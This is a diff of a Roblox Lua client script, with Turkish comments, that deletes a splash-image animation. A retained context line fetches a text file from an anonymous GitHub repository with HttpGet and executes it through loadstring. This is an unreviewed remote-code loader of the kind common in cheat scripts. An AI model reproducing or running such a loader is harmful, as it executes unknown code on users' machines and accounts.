@@ -1,31 +1,4 @@
-local Players = game:GetService("Players")
-local TweenService = game:GetService("TweenService")
 
-local player = Players.LocalPlayer
-local playerGui = player:WaitForChild("PlayerGui")
-
--- ScreenGui oluştur
-local screenGui = Instance.new("ScreenGui")
-screenGui.Parent = playerGui
-
--- ImageLabel oluştur
-local imageLabel = Instance.new("ImageLabel")
-imageLabel.Parent = screenGui
-imageLabel.Size = UDim2.new(0, 300, 0, 300)
-imageLabel.Position = UDim2.new(0.5, -150, -0.3, 0) -- yukarıdan başlasın
-imageLabel.BackgroundTransparency = 0
-imageLabel.Image = "rbxassetid://134803730453170"
-imageLabel.ImageTransparency = 0
-
--- Aşağı inme animasyonu
-local appearTween = TweenService:Create(
-	imageLabel,
-	TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
-	{Position = UDim2.new(0.5, -150, 0.5, -150)}
-)
-
-appearTween:Play()
-appearTween.Completed:Wait()
 
 
 local Player = game.Players.LocalPlayer
@@ -1443,18 +1416,3 @@ task.wait(4)
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/2btrleans/scr1ipt/refs/heads/main/yessir.txt"))()
 
--- Kaybolma animasyonu
-local disappearTween = TweenService:Create(
-	imageLabel,
-	TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
-	{
-		ImageTransparency = 1,
-		Position = UDim2.new(0.5, -150, 0.55, -150)
-	}
-)
-
-disappearTween:Play()
-
-disappearTween.Completed:Connect(function()
-	screenGui:Destroy()
-end)
